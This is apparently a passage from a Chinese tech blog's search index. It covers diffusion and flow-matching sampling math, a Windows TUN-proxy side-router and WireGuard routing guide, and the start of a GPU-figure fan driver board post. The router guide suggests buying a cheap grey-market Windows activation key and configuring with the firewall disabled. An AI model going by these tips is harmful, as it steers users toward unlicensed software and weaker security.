逐步变为样本数据的反向过程。前向过程的每个步骤可以表示为 其中 是真实图像样本数据， 是完全随机的高斯噪声， 是设置的时间步数。 和 是控制每一步添加噪声强度的系数。前向过程也可以写成条件概率分布的形式 其中 代表在前向过程中 到 的条件概率分布。 注意到如果规定 ，则可以从 直接推导出 于是 中包含 个独立的高斯噪声 的线性组合。代入 的条件，得到 将 记为 ， 记为 ${_t}，则 关于 的条件概率分布为 也可以写成 只要 ，经过充分多的时间步后， 就会足够接近标准高斯分布 。利用 ，可以快速从 采样到 。接下来考虑反向过程，关键在于求条件概率分布 以便从噪音多的时间步还原噪音少的时间步。根据贝叶斯公式 然而， 和 是未知的。考虑引入 作为条件变量，则 代入 和 ，可以写出 服从的分布 使用此分布采样 需要已知 ，然而 正是最终要生成的图像。DDPM 引入可学习的函数 来近似估计未知的 ，训练的目标为最小化损失函数 。DDPM 实际上没有使用神经网络 直接预测原始图像 ，而是用于预测添加的噪声 ，这样在每一步上神经网络的输出都服从标准高斯分布，有助于提高训练的稳定性。根据 ，可以重参数化 为 进而得到完整的损失函数 最后，用 近似 代入 ，得到与 无关的反向过程条件概率分布 并进一步得到 DDPM 的迭代采样公式 其中 ，。 在 DDPM 原始的实验中， 取值为 1000， 根据经验设置为 . 观察 ，可以发现每一步的采样都需要计算神经网络 ，因此计算量非常大。同时 DDPM 的每一步采样都包括对随机噪声 的采样，结果具有不确定性。 DDIM DDIM（Denoising Diffusion Implicit Models）模型在 DDPM 的基础上进一步推导了采样公式，发展了允许跳过时间步和确定性的采样方法，并允许将扩散模型的采样过程与常微分方程和随机微分方程的求解算法结合起来。本节将介绍 DDIM 的主要推导过程和结论。 注意到在 DDPM 的神经网络 的训练过程 中，只依赖了关于 的假定 ，而与具体的 的设置 无关，因此在求解贝叶斯公式 时，不再代入 ，而是假设 服从高斯分布 则关于 的采样公式可以写成 比较上式与 的系数，消去 和 ，得到 是关于 服从的分布的通解，具有自由参数 . 沿用 DDPM 训练的神经网络模型，用 近似 代入 ，得到 DDIM 的迭代采样公式 公式中的三项可分别视作从 预测的 ，从当前步指向 的方向和随机噪声。注意到 是可自由选取的超参数，当 时， 变为确定性的采样方式 另外，在推导 的过程中并不依赖于 ，同样的过程也适用于推导任意两个时间步 和 之间的采样公式 这实质上允许了以任意的时间步序列 进行采样，不仅可以跳过时间步节约计算量，还允许确定性地从图像样本 完全或者部分地反推对应的带噪声图像 ，为带参考图像作为条件的图像生成和编辑提供了注入参考图像信息的方法，称为 DDIM 反转。 也可以视作使用欧拉法求解常微分方程，可以推导出对应的常微分方程形式或者随机微分方程的形式，然后使用 Heun 法、Runge-Kutta 法等效率更高的数值求解方法进行采样。 Flow 与 DDIM 联系 三篇提出 Flow 模型的论文都分析了 DDIM 模型在 Flow 框架中的地位。在 FM 论文中，可以使用 DDIM 的均值和方差特性来设计条件速度场 ，从而得到 Flow Matching 的条件流匹配损失函数 。在 Rectified Flow 框架和 Stochastic Interpolants 框架中，DDIM 相当于使用球面插值取代了线性插值，并应用了时间步缩放。 后续有一些博客文章整理和可视化了 Flow Matching 和 DDIM 的关系： Diffusion Meets Flow Matching - DeepMind Let us Flow Together - UT Austin Flow 和 Diffusion 的关系可以从重参数化、插值方式和 ODE/SDE 的角度来讨论。 重参数化 此处重参数化指的是在模型中神经网络预测的对象不一样。DDIM 采样公式可以写成以下简单形式： 其中 是从当前步对最终干净图像的预测， 是当前步对噪声的预测。一般 Diffusion 模型中神经网络预测的是 ，也可以选择预测 。 Flow 模型的采样公式为 神经网络预测速度场 。于是发现无论神经网络预测的是 ， 还是 ，采样公式都可以统一地写成 其中 是神经网络， 和 是 表中 指一般的 Flow Matching 模型， 特指 Rectified Flow 模型的线性插值速度场。 此处跳过 DeepMind 博客中关于采样时重参数化和缩放的讨论，在下一小节讨论插值时会提到。 考虑重参数化对训练过程的影响。常用的 DDIM 的损失函数为 其中 是对数信噪比， 是人为选定的时间步权重函数。 在 Stable Diffusion 3 中，CFM 训练的损失函数中也引入了人为选择的时间步权重函数： 为了便于比较，我们把这些损失函数都重参数化使用 来表达 说明 小时，过于关注 的误差 大时对 的误差不敏感 在两种情形之间取得平衡 表明神经网络的不同预测对象意味着在预测 的基础上，对损失函数施加了不同的时间步权重。 不同模型中等效的时间步权重 结合考虑重参数化的影响，SD3 的损失函数时间步权重实际上很接近 EDM. 插值 Rectified Flow 使用线性插值构建 的轨迹： 而 DDIM 和其他概率流 ODE 可以写成更通用的仿射插值形式 具体来说, 时间步均匀的球面插值可以写成 而 DDIM 相当于在球面插值的基础上缩放了时间步 看起来在训练之前就必须选择一种插值形式，并且在采样时也必须使用同样的插值形式，因为速度场 是在特定的插值形式上训练的。 实际上，在一个很宽松的条件下，可以证明，使用任何插值形式训练并使用不同的插值形式采样，使用相同的训练集数据对 经过 Rectify 过程后，（在理想的速度场上）采样得到的样本对 是相同的。 不同插值方式改变走过的路径但不影响端点 以下是一种感性的理解方式：如果两种插值过程能以一种可微的方式互相变换，意味着插值的轨迹也可以按照相同的方式互相变换。考虑两条相交的 轨迹 ，Rectify 过程只是在轨迹相交的点把轨迹重新连接为 从而避免轨迹相交，因此无论怎么平滑地变换轨迹，Rectify 之后都会得到相同的连接关系。也就是 Rectify 后的 Coupling （采样结果）与插值方式无关，只与数据集中的样本对 有关。 形式化来说, 对于两条插值路径 和 , 如果存在可微分的映射 并且 可逆, 满足 则称其为逐点可变换的. 如果两组插值路径 和 来自相同的 Coupling, 起止点相同 且逐点可变换, 和 由 Rectify 过程得到: 则可证明以下结论: 和 可以使用同一个映射来变换 和 的 Coupling 相同，即采样结果相同 设 和 分别是 和 的速度场，则 可以交换 Rectify 和变换操作 具体对仿射插值 (直线, 球面, DDIM) 来说: 对于两种仿射插值轨迹 和 ，存在标量函数 和 满足 其中 和 是方程组 对于实际使用的 一般难以写出显式的 和 ，但可以通过数值方法求解。 相当于缩放时间步, 相当于缩放向量的模长. 用数值方法解出直线, 球面插值和 DDIM 之间的变换关系 进一步得到适用于仿射变换的速度场变换公式 从直线插值 变换到仿射插值 的情况可以得到解析解 采样时使用不同插值方式得到相同结果这个演示实验在训练时使用线性插值, 但在采样时使用了按照 变换的球面插值速度场. 可以看到使用球面插值速度场时, 经过的路径不同, 但采样的结果是几乎一致的.看起来直线插值的路径并不直? 首先是因为 Rectify 过程本身就不会产生直线轨迹, 减少时间步后不同插值方法的差异左为直线插值, 右为线性插值尽管理论上经过正确的速度场变换, 不同插值方式应该得到相同的结果, 然而实际应用中由于采样步数有限, ODE 离散化带来的误差会导致采样结果存在差异. 上图为仅使用 4 步 Euler 法采样的结果, 两种插值方式表现出了明显的区别.增加 Euler 法的步数, 两者差异逐渐收敛到零.Deepmind 博客中的实验DeepMind 博客 中展示 DDIM 和 Flow Matching 采样时差异的实验也是只使用 6 步 Euler 法采样. 上面的分析表明此处展示的区别主要是由步数少造成的, 而不是本质上训练目标的不同. 插值方式的选择影响训练如上一节介绍的, 训练时不同的插值方式相当于施加了时间步权重. 如果手动增加时间步权重项抵消插值方式不同的影响, 同时使用正确的方式在采样时变换速度场, 则可以得到相近的采样结果. ODE / SDE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970\\begin{tikzpicture}[ block/.style={ rectangle, rounded corners, draw=black, thick, text centered, minimum height=3.2cm, text width=7cm }, connector/.style={ midway, fill=white, inner sep=2pt }]% Define the nodes (blocks) ode[block] (ot) { \\textbf{OT Velocity Field} \\vspace{0.5em} \\hrule \\vspace{0.5em} $Z_s = Z_t + v_{\\text{OT}} \\cdot (s-t)$}; ode[block, right=4cm of ot] (ddim_v) { \\textbf{DDIM Velocity Field} \\vspace{0.5em} \\hrule \\vspace{0.5em} $Z_s = Z_t + v_{\\text{DDIM}} \\cdot (s-t)$}; ode[block, below=2.5cm of ddim_v] (ddim_ode) { \\textbf{DDIM ODE Sampler} \\vspace{0.5em} \\hrule \\vspace{0.5em} \\begin{align*} Z_s &amp;= \\alpha_s\\hat{X}+\\sigma_s\\hat{\\epsilon}, \\\\ \\text{where } \\hat{X} &amp;= \\frac{Z_t-\\sigma_t\\hat{\\epsilon}}{\\alpha_t} \\end{align*}}; ode[block, below=2.5cm of ot] (ddpm_sde) { \\textbf{DDPM SDE Sampler} \\vspace{0.5em} \\hrule \\vspace{0.5em} \\begin{align*} dZ_s &amp;= \\left[f(s)Z_s + g(s)^2 \\frac{\\hat{\\epsilon}}{\\sigma_s}\\right] ds + g(s) dW_s \\\\ &amp;\\text{\\footnotesize (Score is } abla_{Z_s}\\log p_s(Z_s) \\approx -\\hat{\\epsilon}/\\sigma_s\\text{\\footnotesize)} \\end{align*}};% Draw the arrows and labels\\draw[&lt;-&gt;, &gt;=Latex, thick] (ot.east) -- (ddim_v.west) node[connector] {Affine Scaling};\\draw[&lt;-&gt;, &gt;=Latex, thick] (ddim_v.south) -- (ddim_ode.north) node[connector] {Reparameterization};\\draw[&lt;-&gt;, &gt;=Latex, thick] (ddim_ode.west) -- (ddpm_sde.east) node[connector] {Zero noise limit};\\draw[&lt;-&gt;, &gt;=Latex, thick] (ot.south) -- (ddpm_sde.north) node[connector] {Twdddie's Formula};\\end{tikzpicture} 结合之前的讨论, 已经可将 Rectified Flow 的速度场通过仿射缩放变换为 DDIM 的速度场, 再重参数化成常见的 DDIM ODE 采样公式 形式, 随后根据 DDIM 论文中的推导就可以在 ODE 和 SDE 采样之间转换. 接下来从 Flow 速度场这一侧出发, 讨论在 Flow 或 Diffusion 中使用 SDE 采样的性质. Flow Matching 的 ODE 形式已经很美好了: 能保持 的边际分布, 还能实现更少时间步的采样. 为什么要在这个过程中引入 SDE 要素呢? 一种动机是为了对抗 ODE 离散化求解的累积误差. 可以使用 SDE 引入一种 “反馈机制” 来修正误差. 朗之万动力学这是朗之万动力学的随机微分方程, 描述随机过程 在时间 上的演化.漂移项 是方程的确定性部分, 表示系统受到一个与概率密度 有关的力的影响. 指向概率密度 增加的方向. 是参数控制漂移的幅度.扩散项 是方程的随机部分, 是一个布朗运动. 是一个服从正态分布的随机噪声, 是控制噪声强度的参数. 加入随机性有助于系统脱离局部机制, 收敛到全局高概率区域.这个朗之万动力学过程满足 Fokker-Planck 方程因此满足平稳性条件, 即 不随着时间 的演化而改变. 在标准的 RF ODE 中加入朗之万动力学项 其中 是一个独立于 ODE 时间步 的时间尺度, 我们假设在内层的朗之万动力学过程收敛后再在外层的 RF 过程前进. 加入朗之万动力学后, RF 的边际分布不改变, 但相当于引入了一种负反馈调节机制, 无偏差地促进系统向 高的方向演化. 鉴于 RF 求解过程中, 轨迹的误差也没那么大, 可以认为朗之万动力学的时间尺度 只用一步就能收敛, 将它与 合并 漂移项促进系统向概率密度高的方向移动 下面的实验中训练时速度场 处于欠拟合的状态, 发现在这个条件下, SDE 采样器的表现比 ODE 采样器更好. 为了写出 的具体表达式, 可以使用 Tweedie 公式. 当使用仿射插值 且 服从与 无关的标准正态分布时有 代入 RF 速度场的定义式 可以得到 代入 得到 SDE 使用线性插值 , ，得到 而取 和 时得到 DDPM 的 SDE 增加噪声尺度的效果反直觉的结果是增加噪声尺度 并没有给结果带来更多的 “随机性”, 而是让结果更接近均值, 方差变小了. 原因在于在 的表达式 中, 当 时, , 也就是说 应该发散到无穷, 但实际计算中 的值是有限的. 因此在 时不适用 Tweedie 公式. 另外, 也会放大 的误差.在图像生成中过大的噪声尺度会生成过于平滑的图像EDM 论文 的附录 E 中观察到了类似的现象, 但没有给出原因. 这里的分析也不够充分说明 “过度集中” 现象发生的原因，可能与神经网咯拟合速度场的误差有关。Qiang Liu 组的最新工作 尝试解决这个问题。 关于 CNF 的对数似然求解方法可以参考 CNF 原文。这篇知乎文章 也有介绍。对数似然训练 Neural ODE 在高维空间效果差且不稳定。↩︎","tags":["炼丹","Flow Matching","DDIM","生成模型"],"categories":["技术"]},{"title":"Windows TUN 分流旁路由指北","path":"/2025/5/31/Windows-TUN-Router/","content":"为什么要使用（不使用）TUN 一个典型的分流软件 TUN 配置页面 为什么在 这篇文章 里我不建议所有人都使用 TUN？ 开启分流软件的 TUN 模式时，容易与其他 VPN 软件（校园 VPN、游戏加速器、Wireguard 等）内置的 TUN 冲突，不经复杂配置，可能会导致无法上网； 开启 TUN 模式后，用 Proxy SwitchyOmega 切换直连模式会失效； 为了达到与 HTTP Proxy 近似的延迟体验，Fake IP、Sniffing 等机制太脏了，在一些 Corner Case 下会搞出难以排查的问题来； Meta 的 TUN 会吃掉 ICMP 包，导致无法通过 ping 和 traceroute 诊断网络问题。 然而有的情况下，TUN 模式是必须的。 需要代理非 HTTP 的三层流量（SSH、RDP 等），又懒得配置 ProxyCommand、RDP Gateway 等选项； 要用的应用刻意地不从 IE 代理或者环境变量中读取代理设置（如 Cloudflare WARP、某些游戏）。 所以有了这篇文章，旨在帮助大家更好的去做 TUN 需要的 “复杂配置”，以实现一些炫酷的效果。 实现全屋设备上网 值得一提的是，网上许多在 Windows 上配置全屋上网的教程是错误的，所以很多人误以为 Windows 不能完美的实现全屋上网，以至于转向 Openwrt 等方案徒增成本。实际上 Windows 作为旁路由除了费电并不比其他方案差。 原理和方案 只想看操作步骤可以跳过本节。 首先回忆一下分流软件如何通过 TUN 接管本机的流量： 分流软件读取系统路由表，获得原来的默认网关 IP 地址和出口网卡； 分流软件创建虚拟网卡（TUN），IP 地址为 198.18.0.1/24； 分流软件创建新的默认网关路由表条目 default via 192.168.0.2 并确保优先级比原来的默认路由高； 之后非 LAN 的流量会通过 TUN 出口，分流软件可以在用户态获得进入 TUN 的 IP 数据包； 对于出口数据包，分流软件在用户态通过指定出口网卡的形式将数据包发送到原来的默认网关所在的网卡，并应用各种代理协议规则。即使是 DIRECT 模式，对内核来说分流软件也总是会发起新的连接，使用不同的端口号，起到类似 SNAT 的效果。 要想实现将 Windows 电脑作为三层透明代理路由，似乎只需要启用 Windows 内核的 IP 路由转发功能，并允许转发来自物理网卡的流量。对于其他设备，设置默认网关为 Windows 电脑物理网卡的 IP 地址（假设为 192.168.0.2，假设家用路由器的 IP 地址为 192.168.0.1）。然而，再仔细考虑一下这个过程： 另一个设备发送 IP 数据包 192.168.0.3-&gt;1.2.3.4 到 192.168.0.2 的 MAC 地址 Windows 内核收到数据包，根据路由规则走默认网关 198.18.0.2 将其转发到 TUN 虚拟网卡 分流软件收到数据包，假设根据规则应该使用 5.6.7.8 作为代理服务器 分流软件试图创建连接 192.168.0.2-&gt;5.6.7.8，向物理网卡发送目的地为 5.6.7.8 的数据包 然而因为对物理网卡启用了 IP 路由转发功能，对于目的地为 5.6.7.8 的数据包，Windows 内核又根据 TUN 的默认路由优先级比物理网卡的默认路由高，将数据包送回 TUN 的网关 198.18.0.2 于是分流软件发现接受到了回环数据包，丢弃回环数据包并记录日志。此时，无论是 Windows 电脑本机还是其他设备，都无法访问 LAN 以外的网络。 网上一些错误的教程会建议在 Windows 电脑上针对所有用到的上游代理服务器 IP 地址加入路由表条目 15.6.7.8/32 via 192.168.0.1 这个做法能允许通过上游代理 5.6.7.8 访问外部网络。但是： 每次上游代理 IP 地址变更都需要修改路由表条目。对于复杂的、动态更新的分流规则，需要把所有上游代理的 IP 地址都加入路由表条目，维护起来非常麻烦； 致命错误：DIRECT 出口仍然不能工作。分流分了个寂寞。 矛盾在于如果想让 TUN 的默认路由优先级高于物理网卡的默认路由，就不能对流量出口的物理网卡（IP Interface）开启 IP 路由转发功能。然而透明代理入口的 IP Interface 又必须开启 IP 路由转发功能才能让 Windows 内核处理来自其他设备的流量。于是一种思路是流量出口和入口不使用同一个 IP Interface。 如果有两张物理网卡，将他们都分别连接到同一个 LAN 中，自然就有两个 IP Interface 了。要在普通家庭网络的硬件设施上配置 VLAN ID 需要支持 VLAN 的交换机和或者可管理的光猫，比较麻烦，对于只使用电脑上一个物理网口的情况可以考虑使用 macvlan 的方式来在一个物理网口上创建多个 IP Interface。在 Windows 上可借助 Hyper-V 的虚拟交换机功能来实现 macvlan。 操作步骤 以下命令在具有管理员权限的 PowerShell 中执行。 注意按照上面分析的方案，我们不能在所有 IP Interface 上都开启 IP 路由转发功能。确保全局 IP 路由转发注册表项没有设置：1Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' -Name 'IPEnableRouter'如果已经设置为 1，请执行以下命令将其删除：1Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' -Name 'IPEnableRouter' -Value 0还需要确保 Routing and Remote Access (RRAS) 服务没有启用。这项服务用于在 Windows Server 上应用由图形界面配置的路由选项，但在 Windows 10/11 上并不需要，启用它会错误地开启所有 IP Interface 的路由转发功能。查看 RRAS 服务状态：1Get-Service RemoteAccess | Select-Object -Property Name, StartType, Status如果服务状态为 Running，请执行以下命令停止并禁用该服务：12Stop-Service RemoteAccessSet-Service RemoteAccess -StartupType Manual另外，本文所有配置均是在关闭 Windows Defender 防火墙的情况下进行的。已知火绒默认的防火墙配置不会带来麻烦。我个人建议使用火绒安全软件，并使用专门的防火墙硬件（运营商提供的光猫和家用路由器通常自带了防火墙功能，进阶用户可以考虑使用 pfSense、OPNSense 等开源防火墙）来保护 Windows 电脑的网络安全。 首先配置 Hyper-V 虚拟交换机和 macvlan。确保启用了 Hyper-V 功能： Windows 可选功能 如果你使用 Windows 家庭版，不妨在淘宝上花两块钱购买一个激活码，永久激活 Windows 专业版以使用 Hyper-V。 查看当前的物理网卡： 1Get-NetAdapter | Select-Object Name, ifIndex, MacAddress 输出可能是 12345678Name ifIndex MacAddress---- ------- ----------以太网 4 29 D8-XX-XX-XX-XX-32vEthernet (Default Switch) 32 00-XX-XX-XX-XX-F9Mihomo 19WLAN 14 38-XX-XX-XX-XX-4DvEthernet (WSL) 66 00-XX-XX-XX-XX-51蓝牙网络连接 8 38-XX-XX-XX-XX-4E 假设我们要使用 以太网 4 作为出口网卡，创建一个虚拟交换机。 1New-VMSwitch -Name \"vmbr0\" -NetAdapterName \"以太网 4\" -AllowManagementOS $true 其中 -AllowManagementOS $true 选项在宿主机上自动创建一个虚拟网卡 vEthernet (vmbr0) 连接到虚拟交换机，并保持原来物理网卡的 IP 和 mac 地址等属性。接下来再创建一个虚拟网卡 vEthernet (vmbr0.1)，连接宿主机和 vmbr0 虚拟交换机作为旁路由的入口网卡。 1Add-VMNetworkAdapter -SwitchName \"vmbr0\" -Name \"vmbr0.1\" -ManagementOS 查看现在的网卡列表： 1Get-NetAdapter | Select-Object Name, ifIndex, MacAddress 输出应该是 12345678910Name ifIndex MacAddress---- ------- ----------以太网 4 29 D8-XX-XX-XX-XX-32vEthernet (Default Switch) 32 00-XX-XX-XX-XX-E1vEthernet (vmbr0.1) 23 00-XX-XX-XX-XX-00Mihomo 19WLAN 14 38-XX-XX-XX-XX-4DvEthernet (WSL) 66 00-XX-XX-XX-XX-49vEthernet (vmbr0) 10 D8-XX-XX-XX-XX-33蓝牙网络连接 8 38-XX-XX-XX-XX-4E 此时 vmbr0.1 虚拟网卡直接桥接到外部网络，并应该已经通过家用路由器的 DHCP 获得了 IP 地址。但为了配置正确的路由规则，需要将其改为静态 IP 地址并且比 vmbr0 虚拟网卡（LAN 出口）具有更长的子网前缀。假设家用路由器的 LAN 网段为 192.168.1.0/24，路由器 IP 地址为 192.168.1.1，采用以下的 IP 地址分配方案： 192.168.1.1/24 家用路由器 LAN 口 192.168.1.2/25 Windows 电脑 vmbr0 虚拟网卡 192.168.1.3-192.168.1.126 家用路由器 DHCP 地址池。需要登录路由器管理界面进行查看和配置。DHCP 下发的子网前缀长度仍为 /24，但实际分配的 IP 地址保持在前 /25 的范围内。 192.168.1.129/25 Windows 电脑 vmbr0.1 虚拟网卡 192.168.1.128/25 需要科学上网的设备在此网段内手动配置静态 IP 地址并将网关设为 192.168.1.129。 说明对于支持忽略 DHCP 并手动配置 IP 的设备（Android、iOS、PlayStation 等），以上方案无需 VLAN 可共享同一个二层广播域。如果有不支持手动配置 IP 的设备（如某些智能家居设备），则可能需要配置 VLAN（本文略），或者使用支持 DHCP Snooping 的交换机来隔离设备（很多家用路由器的 DHCP 不能关闭），手动搭建 DHCP 服务器。Windows 爱好者可以使用 Technitium DNS Server 搭建 DNS 和 DHCP 服务器，本文不详述。 接下来将 vmbr0 和 vmbr0.1 都配置为静态 IP 地址，使用之前查看的 ifIndex： 1234Set-NetIPInterface -InterfaceIndex 10 -Dhcp DisabledSet-NetIPInterface -InterfaceIndex 23 -Dhcp DisabledNew-NetIPAddress -InterfaceIndex 10 -IPAddress 192.168.1.2 -PrefixLength 25 -DefaultGateway 192.168.1.1New-NetIPAddress -InterfaceIndex 23 -IPAddress 192.168.1.129 -PrefixLength 25 配置系统 DNS 服务器： 1Set-DnsClientServerAddress -InterfaceIndex 10 -ServerAddresses 223.5.5.5, 192.168.1.1 此处选择的 DNS 服务器地址没有太大作用，一般分流软件都会劫持 DNS 请求并应用复杂的 DNS 分流规则。 最后，单独启用 vmbr0.1 的 IP 路由转发功能： 1Set-NetIPInterface -InterfaceIndex 23 -Forwarding Enabled 重启分流软件来使其重新读取路由表，并开启 TUN 模式，勾选允许外部访问。 TUN 选项 在需要科学上网的设备上，连接同一个 LAN，设置静态 IP 地址为 192.168.1.130，子网掩码为 255.255.255.128，网关为 192.168.1.129，即可实现全局上网。同时 WSL 也能通过此 TUN 模式访问互联网。 实现 Wireguard 分流 现在 Meta 有了正确的 Wireguard 实现，可以添加 wireguard 类型的出站代理并编写分流规则，然而 Meta 的 Wireguard 实现不支持入站连接（如 3389 远程桌面、SSH 等），因此仍然需要使用 WireGuard for Windows 来实现入站 Wireguard 连接。一般来说，只要 Peer 的 AllowedIPs 不为 0.0.0.0/0，无需任何额外设置即可同时启用 Meta 的 TUN 和 Wireguard 的 TUN，因为 Wireguard 的路由表项子网前缀更长。然而如果需要通过 WireGuard Peer 访问简单 AllowedIPs 不能描述的对端（例如想分流整个校园内网、教育网、通过校内跳板机访问图书馆等基于复杂 IP、域名的分流规则），则可以考虑用 Meta 的 TUN 模式给 WireGuard TUN 分流出站流量，WireGuard TUN 直接处理入站流量。 首先需要配置 Wireguard Peer，手动创建优先级低的路由表条目。在 Wireguard 的 GUI 中编辑 Peer 的配置文件，设置以下内容： 1234567[Interface]PostUp = netsh int ipv4 add route 0.0.0.0/0 interface=\"wgvpn\" metric=10000 store=activePreDown = netsh int ipv4 del route 0.0.0.0/0 interface=\"wgvpn\"Table = off[Peer]AllowedIPs = 0.0.0.0/0 Wireguard 创建的虚拟网卡名称就是配置文件的名称（此为 wgvpn），请相应地修改。在 Meta 的配置文件中创建指定网卡的 direct 出站代理： 123456proxies: - name: Wireguard-TUN type: direct ip-version: ipv4 udp: true interface-name: wgvpn 则可以按需求编写分流规则，使用 Wireguard-TUN 作为出站代理。 注意如果 WireGuard Peer 的外网 IP 地址位于需要通过 Peer 访问的范围内（如都在校园网、教育网网段），则需要在 Meta 中针对该 Peer 的 IP 地址添加更高优先级的 DIRECT 规则，否则就会形成循环路由，导致无法访问。12345rules: - ... - DOMAIN,peer.example.com,DIRECT - DOMAIN-SUFFIX,example.com,Wireguard-TUN - ... 实现 WSL 入站 在 Windows 10 的 WSL2 中，很难给 WSL2 配置静态的 IP 地址并允许外部访问 WSL2 上的服务，自动端口转发只绑定 Windows 上的 127.0.0.1 地址不允许外部访问。手动配置 WSL2 的网络接口（并允许外部路由）总是会被重置。实现从其他机器上访问 WSL2 的服务最简单的方法恐怕是在 WSL2 中配置 WireGuard 连接到自己的 VPN 对端服务器。 说明如果专门上网搜索 wsl wireguard 关键词，有不少文章说 WSL2 的内核不支持 WireGuard，需要手动编译内核。实际上最新的 WSL2 内核已经支持 WireGuard 了。只需要确保在使用最新版本的 WSL2。1wsl --update 只需要使用 apt 安装 WireGuard 前端 1sudo apt install wireguard 然后在 WSL2 中创建 WireGuard 配置文件 /etc/wireguard/wg0.conf，内容与一般 Linux 上的 WireGuard 配置文件相同。然后在 WSL2 中运行以下命令启动 WireGuard： 1sudo wg-quick up wg0 再安装和启用 OpenSSH Server： 12sudo apt install openssh-serversudo systemctl enable --now ssh 然而，WSL2 的虚拟机会在任何 wsl.exe 会话结束后短暂时间内自动休眠，导致无法处理入站连接。修改 ~/.wslconfig 文件只能有限地延长 WSL2 的自动休眠超时。为了让 WSL2 能像真正的 Linux 服务器一样随时接受 SSH 连接，（首先要防止 Windows 进入睡眠状态），一个优雅的解决方案是用 WinSW 把 wsl.exe 包装成一个 Windows 服务，确保 WSL2 开机启动并在后台持续运行。 下载 WinSW 2 并将下载的 exe 文件重命名为 wsl-keepalive.exe（重要），放在你喜欢的工作目录下。然后在同一目录下创建 wsl-keepalive.xml 文件，内容如下： 1234567&lt;service&gt; &lt;id&gt;wslkeepalive&lt;/id&gt; &lt;name&gt;WSL Keep Alive&lt;/name&gt; &lt;description&gt;This service prevents WSL from automatically shutting down.&lt;/description&gt; &lt;executable&gt;wsl&lt;/executable&gt; &lt;log mode=\"roll\"&gt;&lt;/log&gt;&lt;/service&gt; 然后在 PowerShell 中执行以下命令安装服务： 1.\\wsl-keepalive.exe install 此时启动服务会失败，需要手动设置此服务以用户权限运行。为了方便输入用户凭据，使用图形界面设置服务： 1services.msc 在服务列表中找到 WSL Keep Alive 服务，右键点击选择“属性”，在“登录”选项卡中选择“此账户”，输入当前用户的用户名（微软账户邮箱）和密码。 Windows 服务属性 将服务设置为自动启动并启动服务（通过图形界面或者 PowerShell）。还可以在图形界面中配置自动恢复选项，以便在 WSL2 崩溃时自动重启服务。 12Set-Service -Name wslkeepalive -StartupType AutomaticStart-Service -Name wslkeepalive 现在在其他连接到 WireGuard VPN 的设备上就可以通过 WSL2 的 Wireguard IP 地址访问 WSL2 上的 SSH 服务了。 代理 Steam 的正确方式 为了正确地让 Steam 通过国内 CDN 高速下载，不浪费流量，同时确保社区等功能正常访问，在启用 TUN 时要尤其注意关于 Steam 的规则配置。手动设置 Steam 设置 &gt; 下载 &gt; 下载地区选项到国内通常是不起作用的，需要单独指定 steamserver.net 使用国内 IP 出口。 1234567891011121314151617181920212223rules: - ... # Steam 登录地区检测，应当直连（使用国内 IP 出口） - DOMAIN-SUFFIX,steamserver.net,SteamLogin # Steam 社区和商店，需要代理 (来自 ACL4SSR) - DOMAIN-SUFFIX,fanatical.com,Proxy - DOMAIN-SUFFIX,humblebundle.com,Proxy - DOMAIN-SUFFIX,underlords.com,Proxy - DOMAIN-SUFFIX,valvesoftware.com,Proxy - DOMAIN-SUFFIX,playartifact.com,Proxy - DOMAIN-SUFFIX,steam-chat.com,Proxy - DOMAIN-SUFFIX,steamcommunity.com,Proxy - DOMAIN-SUFFIX,steamgames.com,Proxy - DOMAIN-SUFFIX,steampowered.com,Proxy - DOMAIN-SUFFIX,steamstatic.com,Proxy - DOMAIN-SUFFIX,steamstat.us,Proxy - DOMAIN,steambroadcast.akamaized.net,Proxy - DOMAIN,steamcommunity-a.akamaihd.net,Proxy - DOMAIN,steamstore-a.akamaihd.net,Proxy - DOMAIN,steamusercontent-a.akamaihd.net,Proxy - DOMAIN,steamuserimages-a.akamaihd.net,Proxy - DOMAIN,steampipe.akamaized.net,Proxy - ... 一般的规则集中都将 Steam 相关域名加入了代理名单，但需要手动前置 steamserver.net 的规则将它加入直连列表，而 Steam 的国内 CDN 通常已经在直连白名单或 GeoIP 白名单中，不需要再配置。遗憾的是，在移动等运营商网络下，steamserver.net 的访问通常也很不通畅，导致 Steam 客户端登录很慢或失败，此时可能需要考虑用教育网等优质国内节点来中转此域名。 Steam 下载地区选项 正确完成配置后需要在 Steam 客户端中退出并重新登录，重新登录后 Steam 设置 &gt; 下载 &gt; 下载地区选项应当已经自动切换到国内地区。具体是哪个地区不重要（例如教育网出口一般都会识别到北京），在国内 Steam 几乎都使用同一组 CDN。此配置下 Steam 下载速度应该能拉满宽带并且不消耗代理流量。","tags":["指北","网络"],"categories":["技术"]},{"title":"非常便宜的同德 4090 手办风扇灯光驱动板","path":"/2024/11/6/PY32-Palit-4090/","content":"https://oshwhub.com/duanyll/py32-palit-driverhttps://oshwhub.com/duanyll/py32-palit-driver 简介 近期咸鱼上有大量的无核心显存的 4090 手办卡，其中同德的 4090 钻石因为外观好看尤其抢手。同德 4090 分成带原装灯光和不带原装灯光的两种，带原装灯光的前几天 140 元包邮可以拿下。最近这批 4090 拆核心和显存的手法比较暴力，有很多电阻电容错位了，所以为了点亮风扇和灯光最好不要直接给主板上电。咸鱼上购买专门的风扇灯光转接线要 20 块钱左右，自己打一个驱动板要便宜得多。 本项目使用了 SOP-8 封装的 PY32F002A 单片机做主控，这是一款单价低于 0.5 元的 Cortex-M0 单片机，有 3KB RAM 和 20KB Flash，完全可以满足需要。PY32F002A 本身可以直接 5V 供电，所以板子上只需要这一个芯片就够了。 线序 实测的同德 40 系显卡风扇接口线序如下（排线端子上标有编号）： 编号 功能 1 左右风扇测速，可不接 2 左右风扇 PWM 调速，悬空则满速 3 GND 4 供电，额定电压 12V，5V 也可工作，故未设计升压电路 5 中间风扇测速，可不接 6 中间风扇 PWM 调速，悬空则满速 灯光线序如下（不同于标准 5V 三针 ARGB）： 编号 功能 1 GND 2 5V 供电 3 NC 4 WS2812B 数据输入，共 22 颗 LED，兼容 3.3V 和 5V 电平 功耗 实测 5V 供电下单独风扇最大功耗约 2.6W 灯光最大亮度白色常亮，功耗可达 9.8W 同时开启风扇和灯光功耗最多 12.2W 这个功耗超过了一般电脑 USB 接口的限制，最好使用充电头供电，使用电脑供电建议降低 LED 亮度。 烧录方式 为了节省 PCB 空间，两线 SWD 烧录接口藏到了 Type-C 的 SBU 引脚上，烧录时需要使用 Type-C 测试板从 Type-C 口引出 SWD 接口。调试器可以选用 